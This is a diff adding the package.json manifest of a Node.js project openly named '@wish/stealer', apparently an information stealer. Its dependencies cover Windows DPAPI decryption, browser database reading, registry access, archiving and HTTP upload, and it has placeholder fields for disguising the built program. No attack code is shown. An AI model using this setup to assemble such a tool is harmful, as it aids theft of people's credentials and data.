@@ -1,0 +1,51 @@
+{
+    "name": "@wish/stealer",
+    "description": "%DESCRIPTION% by k4itrun",
+    "version": "%VERSION%",
+    "productVersion": "%PRODUCTVERSION%",
+    "exports": null,
+    "type": "commonjs",
+    "scripts": {
+        "start": "node index"
+    },
+    "config": {
+        "app": "MultipleWindows",
+        "appCompanyName": "%APPCOMPANYNAME%",
+        "appLegalCopyright": "%APPLEGALCOPYRIGHT%",
+        "appFileDescription": "%APPFILEDESCRIPTION%"
+    },
+    "repository": {
+        "type": "git",
+        "url": "git+https://github.com/k4itrun/wish.git"
+    },
+    "keywords": [],
+    "author": {
+        "name": "%AUTHOR%",
+        "email": "billoneta@proto.me"
+    },
+    "license": "%LICENSE%",
+    "bugs": {
+        "url": "https://github.com/k4itrun/wish/issues"
+    },
+    "homepage": "https://github.com/k4itrun/wish#readme",
+    "dependencies": {
+        "archiver": "^7.0.1",
+        "axios": "^1.7.3",
+        "form-data": "^4.0.2",
+        "glob": "^11.0.0",
+        "iconv-lite": "^0.6.3",
+        "node-dpapi-prebuilt": "^1.0.4",
+        "node-forge": "^1.3.1",
+        "node-gyp": "^11.0.0",
+        "sqlite3": "^5.1.7",
+        "winreg": "^1.2.5"
+    },
+    "packageManager": "pnpm@10.9.0",
+    "pnpm": {
+        "onlyBuiltDependencies": [
+            "esbuild",
+            "node-dpapi-prebuilt",
+            "sqlite3"
+        ]
+    }
+}
